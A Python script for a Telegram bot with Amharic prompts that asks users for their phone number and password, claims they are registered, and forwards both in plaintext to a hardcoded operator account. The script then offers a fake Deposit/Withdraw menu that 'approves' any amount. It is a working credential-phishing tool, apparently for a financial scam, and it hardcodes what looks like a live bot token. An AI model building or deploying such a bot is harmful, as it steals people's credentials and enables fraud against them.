
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# ያንተ የቴሌግራም ID (መረጃው በቀጥታ ለአንተ እንዲመጣ)
ADMIN_ID = "6190842606" 

# የውይይት ደረጃዎች
PHONE, PASSWORD, MENU = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"ሰላም {user.first_name}! ወደ ቦቱ በደህና መጡ።\n\nእባክዎ መጀመሪያ የስልክ ቁጥርዎን ያስገቡ፡",
        reply_markup=ReplyKeyboardRemove()
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['phone'] = phone
    
    await update.message.reply_text("አመሰግናለሁ! አሁን ደግሞ የይለፍ ቃልዎን (Password) ያስገቡ፡")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    phone = context.user_data['phone']
    user = update.effective_user
    
    await update.message.reply_text("በስኬት ተመዝግበዋል!")
    
    log_message = (
        f"🔔 **አዲስ ተጠቃሚ ተመዝግቧል!**\n\n"
        f"👤 ስም: {user.first_name}\n"
        f"🆔 ID: {user.id}\n"
        f"📱 ስልክ: `{phone}`\n"
        f"🔑 ፓስወርድ: `{password}`"
    )
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=log_message, parse_mode="Markdown")
    except Exception:
        await context.bot.send_message(chat_id=user.id, text=f"[ለባለቤቱ የሚላክ መረጃ]:\n{log_message}", parse_mode="Markdown")

    keyboard = [['Deposit', 'Withdraw'], ['Support']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text("ምን ማድረግ ይፈልጋሉ? ከታች ካሉት አማራጮች ይምረጡ፡", reply_markup=reply_markup)
    return MENU

async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == 'Deposit':
        await update.message.reply_text("እባክዎ የ Deposit መጠኑን ቁጥር ብቻ ይላኩ:")
    elif text == 'Withdraw':
        await update.message.reply_text("እባክዎ የ Withdraw መጠኑን ቁጥር ብቻ ይላኩ:")
    elif text == 'Support':
        await update.message.reply_text("አስተዳዳሪውን እያገናኘን ነው፣ እባክዎ ይጠብቁ...")
    else:
        if text.isdigit():
            await update.message.reply_text(f"የ {text} ብር ጥያቄዎ ተቀባይነት አግኝቷል!")
        else:
            await update.message.reply_text("እባክዎ ከሜኑ ውስጥ ትክክለኛ ምርጫ ይምረጡ።")
    return MENU

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ሂደቱ ተቋርጧል። እንደገና ለመጀመር /start ይበሉ።", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

if __name__ == '__main__':
    # በ Render ላይ ያለምንም ፕሮክሲ በቀጥታ በፍጥነት ይገናኛል
    app = ApplicationBuilder().token("8960492606:AAEQKJN5S70C3u6OQVVGUkfLNEC7K2w7deA").build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    app.add_handler(conv_handler)
    app.run_polling()
